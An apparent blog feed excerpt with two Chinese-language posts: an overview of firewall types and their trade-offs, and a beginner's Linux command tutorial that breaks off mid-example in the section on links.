    <content type="html"><![CDATA[<p><img src="%E9%98%B2%E7%81%AB%E5%A2%99/640.png"></p><p><strong>什么是防火墙？</strong></p><p>防火墙是一种监视网络流量并检测潜在威胁的安全设备或程序，作为一道保护屏障，它只允许非威胁性流量进入，阻止危险流量进入。</p><p>防火墙是client-server模型中网络安全的基础之一，但它们容易受到以下方面的攻击:</p><ul><li>社会工程攻击（例如，有人窃取密码并进行欺诈）。</li><li>内部威胁（例如，内网中的某人故意更改防火墙设置）。</li><li>人为错误（例如，员工忘记打开防火墙或忽略更新通知）。</li></ul><p><img src="640-1690455930828-9.png" alt="图片"></p><p><img src="640-1690455925626-3.png" alt="图片"></p><p><strong>防火墙是如何工作的？</strong></p><p>企业在网络中设置内联防火墙，作为外部源和受保护系统之间的边界。管理员创建阻塞点，防火墙在阻塞点检查所有进出网络的数据包，包含:</p><ul><li><p>有效负载（实际内容）。</p></li><li><p>标头（有关数据的信息，例如谁发送了数据，发给了谁）。</p></li></ul><p>防火墙根据预设规则分析数据包，以区分良性和恶意流量。这些规则集规定了防火墙如何检查以下内容：</p><ul><li>源IP和目的IP 地址。</li><li>有效负载中的内容。</li><li>数据包协议（例如，连接是否使用 TCP/IP 协议）。</li><li>应用协议（HTTP、Telnet、FTP、DNS、SSH 等）。</li><li>表明特定网络攻击的数据模式。</li></ul><p>防火墙阻止所有不符合规则的数据包，并将安全数据包路由到预期的接收者。当防火墙阻止流量进入网络时，有两种选择：</p><ul><li>默默地放弃请求。</li><li>向发件人发送error信息。</li></ul><p>这两种选择都可以将危险流量排除在网络之外。通常，安全团队更喜欢默默放弃请求以限制信息，以防潜在的黑客测试防火墙的漏洞。</p><p><img src="640-1690455928616-6.png" alt="图片"></p><p><strong>基于部署方式的防火墙类型</strong></p><p>根据部署方式，可以将防火墙分为三种类型：硬件防火墙、软件防火墙和基于云的防火墙。</p><p><img src="640-1690455948080-12.png" alt="图片"></p><p><strong>软件防火墙</strong></p><p>软件防火墙（或主机防火墙）直接安装在主机设备上。这种类型的防火墙只保护一台机器（网络终端、台式机、笔记本电脑、服务器等），因此管理员必须在他们想要保护的每台设备上安装一个版本的软件。</p><p>由于管理员将软件防火墙附加到特定设备上，因此这些防火墙不可避免地会占用一些系统 RAM 和 CPU，这在某些情况下是一个问题。</p><p>软件防火墙的优点：</p><ul><li>为指定设备提供出色的保护。</li><li>将各个网络端点彼此隔离。</li><li>高精度的安全性，管理员可以完全控制允许的程序。</li><li>随时可用。</li></ul><p>软件防火墙的缺点：</p><ul><li><p>消耗设备的 CPU、RAM 和存储空间。</p></li><li><p>需要为每个主机设备配置。</p></li><li><p>日常维护既困难又耗时。</p></li><li><p>并非所有设备都与每个防火墙兼容，因此可能必须在同一网络中使用不同的解决方案。</p></li></ul><p><strong>硬件防火墙</strong></p><p>硬件防火墙（或设备防火墙）是一个单独的硬件，用于过滤进出网络的流量。与软件防火墙不同，这些独立设备有自己的资源，不会占用主机设备的任何 CPU 或 RAM。</p><p>硬件防火墙相对更适合大型企业，中小型企业可能更多地会选择在每台主机上安装软件防火墙的方式，硬件防火墙对于拥有多个包含大量计算机的子网的大型组织来说是一个极好的选择。</p><p>硬件防火墙的优点：</p><ul><li>使用一种解决方案保护多台设备。</li><li>顶级边界安全性，因为恶意流量永远不会到达主机设备。</li><li>不消耗主机设备资源。</li><li>管理员只需为整个网络管理一个防火墙。</li></ul><p>硬件防火墙的缺点：</p><ul><li><p>比软件防火墙更昂贵。</p></li><li><p>内部威胁是一个相当大的弱点。</p></li><li><p>与基于软件的防火墙相比，配置和管理需要更多的技能。</p></li></ul><p><strong>基于云的防火墙</strong></p><p>许多供应商提供基于云的防火墙，它们通过 Internet 按需提供。这些服务也称为防火墙即服务（FaaS），以IaaS 或 PaaS的形式运行。</p><p>基于云的防火墙非常适用于：</p><ul><li>高度分散的业务。</li><li>在安全资源方面存在缺口的团队。</li><li>不具备必要的内部专业知识的公司。</li></ul><p>与基于硬件的解决方案一样，云防火墙在边界安全方面表现出色，同时也可以在每个主机的基础上设置这些系统。</p><p>云防火墙的优点：</p><ul><li>服务提供商处理所有管理任务（安装、部署、修补、故障排除等）。</li><li>用户可以自由扩展云资源以满足流量负载。</li><li>无需任何内部硬件。</li><li>高可用性。</li></ul><p>云防火墙的缺点：</p><ul><li>供应商究竟如何运行防火墙缺乏透明度。</li><li>与其他基于云的服务一样，这些防火墙很难迁移到新的提供商。</li><li>流量流经第三方可能会增加延迟和隐私问题。</li><li>由于高昂的运营成本，从长远来看是比较贵的。</li></ul><p><img src="640-1690455952565-15.png" alt="图片"></p><p><strong>基于操作方法的防火墙类型</strong></p><p>下面是基于功能和 OSI 模型的五种类型的防火墙。</p><p><img src="640-1690455954842-18.png" alt="图片"></p><p><strong>包过滤防火墙</strong></p><p>包过滤防火墙充当网络层的检查点，并将每个数据包的标头信息与一组预先建立的标准进行比较。这些防火墙检查以下基于标头的信息：</p><ul><li>目的地址和源 IP 地址。</li><li>数据包类型。</li><li>端口号。</li><li>网络协议。</li></ul><p>这些类型的防火墙仅分析表面的细节，不会打开数据包来检查其有效负载。包过滤防火墙在不考虑现有流量的情况下真空检查每个数据包。 包过滤防火墙非常适合只需要基本安全功能来抵御既定威胁的小型组织。</p><p>包过滤防火墙的优点：</p><ul><li>低成本。</li><li>快速包过滤和处理。</li><li>擅长筛选内部部门之间的流量。</li><li>低资源消耗。</li><li>对网络速度和最终用户体验的影响最小。</li><li>多层防火墙策略中出色的第一道防线。</li></ul><p>包过滤防火墙的缺点：</p><ul><li><p>不检查数据包有效负载（实际数据）。</p></li><li><p>对于有经验的黑客来说很容易绕过。</p></li><li><p>无法在应用层进行过滤。</p></li><li><p>容易受到 IP 欺骗攻击，因为它单独处理每个数据包。</p></li><li><p>没有用户身份验证或日志记录功能。    </p></li><li><p>访问控制列表的设置和管理具有挑战性。</p></li></ul><p><strong>电路级网关</strong></p><p>电路级网关在 OSI 会话层运行，并监视本地和远程主机之间的TCP（传输控制协议）握手。其可以在不消耗大量资源的情况下快速批准或拒绝流量。但是，这些系统不检查数据包，因此如果 TCP 握手通过，即使是感染了恶意软件的请求也可以访问。</p><p>电路级网关的优点：</p><ul><li>仅处理请求的事务，并拒绝所有其他流量。</li><li>易于设置和管理。</li><li>资源和成本效益。</li><li>强大的地址暴露保护。</li><li>对最终用户体验的影响最小。</li></ul><p>电路级网关的缺点：</p><ul><li><p>不是一个独立的解决方案，因为没有内容过滤。</p></li><li><p>通常需要对软件和网络协议进行调整。</p></li></ul><p><strong>状态检测防火墙</strong></p><p>状态检测防火墙（或动态包过滤防火墙）在网络层和传输层监控传入和传出的数据包。这类防火墙结合了数据包检测和 TCP 握手验证。</p><p>状态检测防火墙维护一个表数据库，该数据库跟踪所有打开的连接使系统能够检查现有的流量流。该数据库存储所有与关键数据包相关的信息，包括：</p><ul><li>源IP。</li><li>源端口。</li><li>目的 IP。</li><li>每个连接的目标端口。</li></ul><p>当一个新数据包到达时，防火墙检查有效连接表。检测过的数据包无需进一步分析即可通过，而防火墙会根据预设规则集评估不匹配的流量。</p><p>状态检测防火墙的优点：</p><ul><li>过滤流量时会自动通过以前检查过的数据包。</li><li>在阻止利用协议缺陷的攻击方面表现出色。</li><li>无需打开大量端口来让流量进出，这可以缩小攻击面。</li><li>详细的日志记录功能，有助于数字取证。</li><li>减少对端口扫描器的暴露。</li></ul><p>状态检测防火墙的缺点：</p><ul><li><p>比包过滤防火墙更昂贵。</p></li><li><p>需要高水平的技能才能正确设置。</p></li><li><p>通常会影响性能并导致网络延迟。</p></li><li><p>不支持验证欺骗流量源的身份验证。</p></li><li><p>容易受到利用预先建立连接的 TCP Flood攻击。</p></li></ul><p><strong>代理防火墙</strong></p><p>代理防火墙（或应用级网关）充当内部和外部系统之间的中介。这类防火墙会在客户端请求发送到主机之前对其进行屏蔽，从而保护网络。</p><p>代理防火墙在应用层运行，具有深度包检测 (DPI)功能，可以检查传入流量的有效负载和标头。</p><p>当客户端发送访问网络的请求时，消息首先到达代理服务器。</p><p>防火墙会检查以下内容：</p><ul><li>客户端和防火墙后面的设备之间的先前通信（如果有的话）。</li><li>标头信息。</li><li>内容本身。</li></ul><p>然后代理屏蔽该请求并将消息转发到Web 服务器。此过程隐藏了客户端的 ID。服务器响应并将请求的数据发送给代理，之后防火墙将信息传递给原始客户端。</p><p>代理防火墙是企业保护 Web应用免受恶意用户攻击的首选。</p><p>代理防火墙的优点：</p><ul><li>DPI检查数据包标头和有效负载 。</li><li>在客户端和网络之间添加了一个额外的隔离层。</li><li>对潜在威胁行为者隐藏内部 IP 地址。</li><li>检测并阻止网络层不可见的攻击。</li><li>对网络流量进行细粒度的安全控制。</li><li>解除地理位置限制。</li></ul><p>代理防火墙的缺点：</p><ul><li><p>由于彻底的数据包检查和额外的通信步骤，会导致延迟增加。</p></li><li><p>由于处理开销高，不如其他类型的防火墙成本低。</p></li><li><p>设置和管理具有挑战性。</p></li><li><p>不兼容所有网络协议。</p></li></ul><p><strong>下一代防火墙</strong></p><p>下一代防火墙(NGFW)是将其他防火墙的多种功能集成在一起的安全设备或程序。这样的系统提供：</p><ul><li>分析流量内容的深度数据包检测（DPI）。</li><li>TCP 握手检查。</li><li>表层数据包检测。</li></ul><p>下一代防火墙还包括额外的网络安全措施，例如：</p><ul><li>IDS 和 IPS。</li><li>恶意软件扫描和过滤。</li><li>高级威胁情报（模式匹配、基于协议的检测、基于异常的检测等）</li><li>防病毒程序。</li><li>网络地址转换 (NAT)。</li><li>服务质量 (QoS)功能。</li><li>SSH检查。</li></ul><p>NGFW 是医疗保健或金融等受到严格监管的行业的常见选择。</p><p>下一代防火墙的优点：</p><ul><li>将传统防火墙功能与高级网络安全功能相结合。</li><li>检查从数据链路层到应用层的网络流量。</li><li>日志记录功能。</li></ul><p>下一代防火墙的缺点：</p><ul><li>比其他防火墙更昂贵。</li><li>存在单点故障。</li><li>部署时间缓慢。</li><li>需要高度的专业知识才能设置和运行。</li><li>影响网络性能。</li></ul><p>任何一个保护层，无论多么强大，都不足以完全保护你的业务。企业往往会在同一个网络中设置多个防火墙，选择理想的防火墙首先要了解企业网络的架构和功能，确定这些不同类型的防火墙和防火墙策略哪个最适合自己。通常情况下，企业网络应该设置多层防火墙，既在外围保护又在网络上分隔不同的资产，从而使你的网络更难破解。 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux基础总结</title>
    <link href="/2023/07/26/linux%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/"/>
    <url>/2023/07/26/linux%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>Linux 的学习对于一个程序员的重要性是不言而喻的。前端开发相比后端开发，接触 Linux 机会相对较少，因此往往容易忽视它。但是学好它却是程序员必备修养之一。</p><p>Linux 基础</p><p><strong>操作系统</strong></p><p>操作系统 <code>Operating System</code> 简称 <code>OS</code> ，是软件的一部分，它是硬件基础上的第一层软件，是硬件和其它软件沟通的桥梁。</p><p>操作系统会控制其他程序运行，管理系统资源，提供最基本的计算功能，如管理及配置内存、决定系统资源供需的优先次序等，同时还提供一些基本的服务程序。</p><p><img src="640wx_fmt=jpeg&random=0.9365049272426487&random=0.5303248102537135&random=0.8220009451519892&random=0.6958476699232452&random=0.jpeg" alt="图片"></p><p><strong>什么是Linux</strong></p><p><strong>Linux 系统内核与 Linux 发行套件的区别</strong></p><ul><li> <code>Linux</code> 系统内核指的是由 <code>Linus Torvalds</code> 负责维护，提供硬件抽象层、硬盘及文件系统控制及多任务功能的系统核心程序。 </li><li> <code>Linux</code> 发行套件系统是我们常说的 <code>Linux</code> 操作系统，也即是由  <code>Linux</code> 内核与各种常用软件的集合产品。 </li></ul><p><strong>总结</strong>：<strong>真正的</strong> <code>Linux</code> <strong>指的是系统内核，而我们常说的</strong> <code>Linux</code> <strong>指的是“发行版完整的包含一些基础软件的操作系统”。</strong></p><p><strong>Linux 对比 Windows</strong></p><ol><li><strong>稳定且有效率；</strong> </li><li><strong>免费（或少许费用）；</strong> </li><li><strong>漏洞少且快速修补；</strong> </li><li><strong>多任务多用户；</strong> </li><li><strong>更加安全的用户与文件权限策略；</strong> </li><li><strong>适合小内核程序的嵌入系统；</strong> </li><li><strong>相对不耗资源。</strong> </li></ol><p><strong>Linux 系统种类</strong></p><ul><li><strong>红帽企业版</strong> <code>Linux</code> ：<code>RHEL</code> 是全世界内使用最广泛的 <code>Linux</code> 系统。它具有极强的性能与稳定性，是众多生成环境中使用的（收费的）系统。 </li><li><strong>Fedora</strong> ：由红帽公司发布的桌面版系统套件，用户可以免费体验到最新的技术或工具，这些技术或工具在成熟后会被加入到 <code>RHEL</code> 系统中，因此 <code>Fedora</code> 也成为 <code>RHEL</code> 系统的试验版本。 </li><li><strong>CentO</strong>S ：通过把<code>RHEL</code> 系统重新编译并发布给用户免费使用的 <code>Linux</code> 系统，具有广泛的使用人群。 </li><li><strong>Deepin</strong> ：中国发行，对优秀的开源成品进行集成和配置。 </li><li><strong>Debian</strong> ：稳定性、安全性强，提供了免费的基础支持，在国外拥有很高的认可度和使用率。 </li><li><strong>Ubuntu</strong> ：是一款派生自 <code>Debian</code> 的操作系统，对新款硬件具有极强的兼容能力。<code>Ubuntu</code> 与 <code>Fedora</code> 都是极其出色的 <code>Linux</code> 桌面系统，而且 <code>Ubuntu</code> 也可用于服务器领域。</li></ul><p><strong>终端连接阿里云服务器</strong></p><p><img src="640wx_fmt=jpeg&random=0.6315947872318632&random=0.469442625726183&random=0.596998089326775&random=0.713743151709127&random=0.jpeg" alt="图片"></p><p>通过执行 <code>ssh root@121.42.11.34</code> 命令，然后输入服务器连接密码就可以顺利登录远程服务器。从现在开始我们就可以在本地电脑操作远程服务器。</p><ol><li>这个黑色的面板就是终端也就是 <code>Shell</code> （命令行环境）。 </li><li><code>ssh root@xxx</code> 这是一条命令，必须要在 <code>Shell</code> 中才能执行。 </li></ol><p><strong>Shell</strong></p><p><code>Shell</code> 这个单词的原意是“外壳”，跟 <code>kernel</code>（内核）相对应，比喻内核外面的一层，即用户跟内核交互的对话界面。</p><ul><li><code>Shell</code> 是一个程序，提供一个与用户对话的环境。这个环境只有一个命令提示符，让用户从键盘输入命令，所以又称为命令行环境（ <code>command line interface</code> ，简写为 <code>CLI</code> ）。<code>Shell</code> 接收到用户输入的命令，将命令送入操作系统执行，并将结果返回给用户。 </li><li><code>Shell</code> 是一个命令解释器，解释用户输入的命令。它支持变量、条件判断、循环操作等语法，所以用户可以用 <code>Shell</code> 命令写出各种小程序，又称为 <code>Shell</code> 脚本。这些脚本都通过 <code>Shell</code> 的解释执行，而不通过编译。 </li><li> <code>Shell</code> 是一个工具箱，提供了各种小工具，供用户方便地使用操作系统的功能。 </li></ul><p><strong>Shell 的种类</strong></p><p><code>Shell</code> 有很多种，只要能给用户提供命令行环境的程序，都可以看作是 <code>Shell</code> 。</p><p>历史上，主要的 <code>Shell</code> 有下面这些：</p><ul><li>Bourne Shell（sh） </li><li>Bourne Again shell（bash） </li><li>C Shell（csh） </li><li>TENEX C Shell（tcsh） </li><li>Korn shell（ksh） </li><li>Z Shell（zsh） </li><li>Friendly Interactive Shell（fish） </li></ul><p>其中 <code>Bash</code> 是目前最常用的 <code>Shell</code> 。MacOS 中的默认 <code>Shell</code> 就是 <code>Bash</code> 。</p><p>通过执行 <code>echo $SHELL</code> 命令可以查看到当前正在使用的 <code>Shell</code> 。还可以通过 <code>cat /etc/shells</code> 查看当前系统安装的所有 <code>Shell</code> 种类。</p><p><strong>命令</strong></p><p><strong>命令行提示符</strong></p><p>进入命令行环境以后，用户会看到 <code>Shell</code> 的提示符。提示符往往是一串前缀，最后以一个美元符号 <code>$</code> 结尾，用户可以在这个符号后面输入各种命令。</p><p>执行一个简单的命令 <code>pwd</code>：</p><figure class="highlight autoit"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZm5e8dsxce9ufaic7hi3uZ</span> ~]<span class="hljs-meta"># pwd</span><br>/root<br></code></pre></td></tr></table></figure><p>命令解析：</p><ul><li><code>root</code> ：表示用户名；</li><li><code>iZm5e8dsxce9ufaic7hi3uZ</code> ：表示主机名；</li><li><code>~</code> ：表示目前所在目录为家目录，其中 <code>root</code> 用户的家目录是 <code>/root</code> 普通用户的家目录在 /home 下；</li><li><code>#</code> ：指示你所具有的权限（<code>root</code> 用户为 <code>#</code> ，普通用户为 <code>$</code> ）。</li><li>执行 <code>whoami</code> 命令可以查看当前用户名；</li><li>执行 <code>hostname</code> 命令可以查看当前主机名；</li></ul><p>关于如何创建、切换、删除用户，在后面的用户与权限会具体讲解，这里先使用 <code>root</code> 用户进行演示。</p><p>[备注] <code>root</code> 是超级用户，具备操作系统的一切权限。</p><p><strong>命令格式</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> parameters（命令 参数）<br></code></pre></td></tr></table></figure><p><strong>长短参数</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">单个参数：<span class="hljs-keyword">ls</span> -<span class="hljs-keyword">a</span>（<span class="hljs-keyword">a</span> 是英文 <span class="hljs-keyword">all</span> 的缩写，表示“全部”）<br>多个参数：<span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span>（全部文件 + 列表形式展示）<br>单个长参数：<span class="hljs-keyword">ls</span> --<span class="hljs-keyword">all</span><br>多个长参数：<span class="hljs-keyword">ls</span> --<span class="hljs-built_in">reverse</span> --<span class="hljs-keyword">all</span><br>长短混合参数：<span class="hljs-keyword">ls</span> --<span class="hljs-keyword">all</span> -<span class="hljs-keyword">l</span><br></code></pre></td></tr></table></figure><p><strong>参数值</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">短参数：<span class="hljs-keyword">command</span> -p 10（例如：ssh root@121.42.11.34 -p 22）<br>长参数：<span class="hljs-keyword">command</span> <span class="hljs-params">--paramters=10</span>（例如：ssh root@121.42.11.34 <span class="hljs-params">--port=22</span>）<br></code></pre></td></tr></table></figure><p><strong>快捷方式</strong></p><p>在开始学习 <code>Linux</code> 命令之前，有这么一些快捷方式，是必须要提前掌握的，它将贯穿整个 <code>Linux</code> 使用生涯。</p><ul><li>通过上下方向键 ↑ ↓ 来调取过往执行过的 <code>Linux</code> 命令； </li><li>命令或参数仅需输入前几位就可以用 Tab 键补全； </li><li><code>Ctrl + R</code> ：用于查找使用过的命令（<code>history</code> 命令用于列出之前使用过的所有命令，然后输入 <code>!</code> 命令加上编号( <code>!2</code> )就可以直接执行该历史命令）； </li><li><code>Ctrl + L</code> ：清除屏幕并将当前行移到页面顶部； </li><li><code>Ctrl + C</code> ：中止当前正在执行的命令； </li><li><code>Ctrl + U</code> ：从光标位置剪切到行首； </li><li><code>Ctrl + K</code> ：从光标位置剪切到行尾； </li><li><code>Ctrl + W</code> ：剪切光标左侧的一个单词； </li><li><code>Ctrl + Y</code> ：粘贴 <code>Ctrl + U | K | Y</code> 剪切的命令； </li><li><code>Ctrl + A</code> ：光标跳到命令行的开头； </li><li><code>Ctrl + E</code> ：光标跳到命令行的结尾； </li><li><code>Ctrl + D</code> ：关闭 <code>Shell</code> 会话； </li></ul><p><strong>文件和目录</strong></p><p><strong>文件的组织</strong></p><p><img src="640wx_fmt=jpeg&random=0.42844309081680043&random=0.7539888913364345&random=0.9011560287480525&random=0.3323769948954649&random=0.jpeg" alt="图片"></p><p><strong>查看路径</strong></p><p><strong>pwd****：</strong>显示当前目录的路径</p><p><img src="640wx_fmt=png&random=0.25201999846504086&random=0.5959545257332086&random=0.8082386466153098&random=0.png" alt="图片"></p><p><strong>which</strong>：查看命令的可执行文件所在路径，<code>Linux</code> 下，每一条命令其实都对应一个可执行程序，在终端中输入命令，按回车的时候，就是执行了对应的那个程序，<code>which</code> 命令本身对应的程序也存在于 <code>Linux</code> 中。</p><p>总的来说一个命令就是一个可执行程序。</p><p><img src="640wx_fmt=jpeg&random=0.3663720918334894&random=0.015724954262419377&random=0.6736048718721672&random=0.jpeg" alt="图片"></p><p><strong>浏览和切换目录</strong></p><p><strong>ls****：</strong>列出文件和目录，它是 <code>Linux</code> 最常用的命令之一。</p><p>【<strong>常用参数</strong>】</p><ul><li><code>-a</code> 显示所有文件和目录包括隐藏的 </li><li><code>-l</code> 显示详细列表 </li><li><code>-h</code> 适合人类阅读的 </li><li><code>-t</code> 按文件最近一次修改时间排序 </li><li><code>-i</code> 显示文件的 <code>inode</code>（ <code>inode</code> 是文件内容的标识）</li></ul><p><img src="640wx_fmt=png&random=0.18288376351046476&random=0.012812092814984632&random=0.820939503931656&random=0.png" alt="图片"></p><p><strong>cd</strong>：<code>cd</code> 是英语 <code>change directory</code> 的缩写，表示切换目录。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">cd</span> / --&gt;</span> 跳转到根目录<br><span class="hljs-function"><span class="hljs-title">cd</span> ~ --&gt;</span> 跳转到家目录<br><span class="hljs-function"><span class="hljs-title">cd</span> .. --&gt;</span> 跳转到上级目录<br><span class="hljs-function"><span class="hljs-title">cd</span> ./home --&gt;</span> 跳转到当前目录的home目录下<br><span class="hljs-function"><span class="hljs-title">cd</span> /home/lion --&gt;</span> 跳转到根目录下的home目录下的lion目录<br><span class="hljs-function"><span class="hljs-title">cd</span> --&gt;</span> 不添加任何参数，也是回到家目录<br></code></pre></td></tr></table></figure><p>[<strong>注意</strong>] 输入 <code>cd /ho</code> 单次 <code>tab</code> 键会自动补全路径 + 两次 <code>tab</code> 键会列出所有可能的目录列表。</p><p><strong>du****：</strong>列举目录大小信息。</p><p>【<strong>常用参数</strong>】</p><ul><li><code>-h</code> 适合人类阅读的； </li><li><code>-a</code> 同时列举出目录下文件的大小信息； </li><li><code>-s</code> 只显示总计大小，不显示具体信息。 </li></ul><p><strong>浏览和创建文件</strong></p><p><strong>cat</strong>：一次性显示文件所有内容，更适合查看小的文件。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-built_in">cat</span> cloud-init.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>【<strong>常用参数</strong>】</p><ul><li><code>-n</code> 显示行号。</li></ul><p><strong>less</strong>：分页显示文件内容，更适合查看大的文件。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">less cloud-init.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>【<strong>快捷操作</strong>】</p><ul><li><strong>空格键</strong>：前进一页（一个屏幕）； </li><li><strong>b 键</strong>：后退一页； </li><li><strong>回车键</strong>：前进一行； </li><li><strong>y 键</strong>：后退一行； </li><li><strong>上下键</strong>：回退或前进一行； </li><li><strong>d 键</strong>：前进半页； </li><li><strong>u 键</strong>：后退半页； </li><li><strong>q 键</strong>：停止读取文件，中止 <code>less</code> 命令； </li><li><strong>= 键</strong>：显示当前页面的内容是文件中的第几行到第几行以及一些其它关于本页内容的详细信息； </li><li><strong>h 键</strong>：显示帮助文档； </li><li><strong>/ 键</strong>：进入搜索模式后，按 n 键跳到一个符合项目，按 N 键跳到上一个符合项目，同时也可以输入正则表达式匹配。 </li></ul><p><strong>head</strong>：显示文件的开头几行（默认是10行）</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stan"><span class="hljs-built_in">head</span> cloud-init.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>【<strong>参数</strong>】</p><ul><li><code>-n</code> 指定行数 <code>head cloud-init.log -n 2</code></li></ul><p><strong>tail</strong>：显示文件的结尾几行（默认是10行）</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stan"><span class="hljs-built_in">tail</span> cloud-init.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>【<strong>参数</strong>】</p><ul><li><code>-n</code> 指定行数 <code>tail cloud-init.log -n 2</code></li><li><code>-f</code> 会每过1秒检查下文件是否有更新内容，也可以用 -s 参数指定间隔时间 <code>tail -f -s 4 xxx.log</code> </li></ul><p><strong>touch</strong>：创建一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> new_file<br></code></pre></td></tr></table></figure><p><strong>mkdir</strong>：创建一个目录</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir new_folder<br></code></pre></td></tr></table></figure><p>【<strong>常用参数</strong>】</p><ul><li><code>-p</code> 递归的创建目录结构 <code>mkdir -p one/two/three</code> </li></ul><p><strong>文件的复制和移动</strong></p><p><strong>cp</strong>：拷贝文件和目录</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">cp <span class="hljs-keyword">file</span> file_copy --&gt; <span class="hljs-keyword">file</span> 是目标文件，file_copy 是拷贝出来的文件<br>cp <span class="hljs-keyword">file</span> <span class="hljs-keyword">one</span> --&gt; 把 <span class="hljs-keyword">file</span> 文件拷贝到 <span class="hljs-keyword">one</span> 目录下，并且文件名依然为 <span class="hljs-keyword">file</span><br>cp <span class="hljs-keyword">file</span> <span class="hljs-keyword">one</span>/file_copy --&gt; 把 <span class="hljs-keyword">file</span> 文件拷贝到 <span class="hljs-keyword">one</span> 目录下，文件名为file_copy<br>cp *.txt folder --&gt; 把当前目录下所有 txt 文件拷贝到 folder 目录下<br></code></pre></td></tr></table></figure><p>【<strong>常用参数</strong>】</p><ul><li><code>-r</code> 递归的拷贝，常用来拷贝一整个目录</li></ul><p><strong>mv</strong>：移动（重命名）文件或目录，与cp命令用法相似。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">mv <span class="hljs-built_in">file</span> <span class="hljs-literal">one</span> <span class="hljs-comment">--&gt; 将 file 文件移动到 one 目录下</span><br>mv new_folder <span class="hljs-literal">one</span> <span class="hljs-comment">--&gt; 将 new_folder 文件夹移动到one目录下</span><br>mv *.txt <span class="hljs-built_in">folder</span> <span class="hljs-comment">--&gt; 把当前目录下所有 txt 文件移动到 folder 目录下</span><br>mv <span class="hljs-built_in">file</span> new_file <span class="hljs-comment">--&gt; file 文件重命名为 new_file</span><br></code></pre></td></tr></table></figure><p><strong>文件的删除和链接</strong></p><p><strong>rm</strong>：删除文件和目录，由于 Linux 下没有回收站，一旦删除非常难恢复，因此需要谨慎操作</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">rm</span> new_file  --&gt; 删除 new_file 文件<br><span class="hljs-symbol">rm</span> <span class="hljs-built_in">f1</span> <span class="hljs-built_in">f2</span> <span class="hljs-built_in">f3</span>  --&gt; 同时删除 <span class="hljs-built_in">f1</span> <span class="hljs-built_in">f2</span> <span class="hljs-built_in">f3</span> <span class="hljs-number">3</span>个文件<br></code></pre></td></tr></table></figure><p>【常用参数】</p><ul><li><code>-i</code> 向用户确认是否删除； </li><li><code>-f</code> 文件强制删除； </li><li><code>-r</code> 递归删除文件夹，著名的删除操作 <code>rm -rf</code> 。 </li></ul><p><strong>ln</strong>：英文 Link 的缩写，表示创建链接。</p><p>学习创建链接之前，首先要理解链接是什么，我们先来看看 Linux 的文件是如何存储的：</p><p>Linux  文件的存储方式分为3个部分，文件名、文件内容以及权限，其中文件名的列表是存储在硬盘的其它地方和文件内容是分开存放的，每个文件名通过 inode 标识绑定到文件内容。</p><p>Linux 下有两种链接类型：硬链接和软链接。</p><p><strong>硬链接</strong></p><p>使链接的两个文件共享同样文件内容，就是同样的 inode ，一旦文件1和文件2之间有了硬链接，那么修改任何一个文件，修改的都是同一块内容，它的缺点是，只能创建指向文件的硬链接，不能创建指向目录的（其实也可以，但比较复杂）而软链接都可以，因此软链接使用更加广泛。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">ln</span> file1 file2  <span class="hljs-comment">--&gt; 创建 file2 为 file1 的硬链接</span><br></code></pre></td></tr></table></figure><p><img src="640wx_fmt=png&random=0.8588130067817377&random=0.7259365015630768&random=0.4314433411553025&random=0.png" alt="图片"></p><p>如果我们用 rm file1 来删除 file1 ，对 file2 没有什么影响，对于硬链接来说，删除任意一方的文件，共同指向的文件内容并不会从硬盘上删除。只有同时删除了 file1 与 file2 后，它们共同指向的文件内容才会消失。</p><p><strong>软链接</strong></p><p>软链接就类似 windows 下快捷方式。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 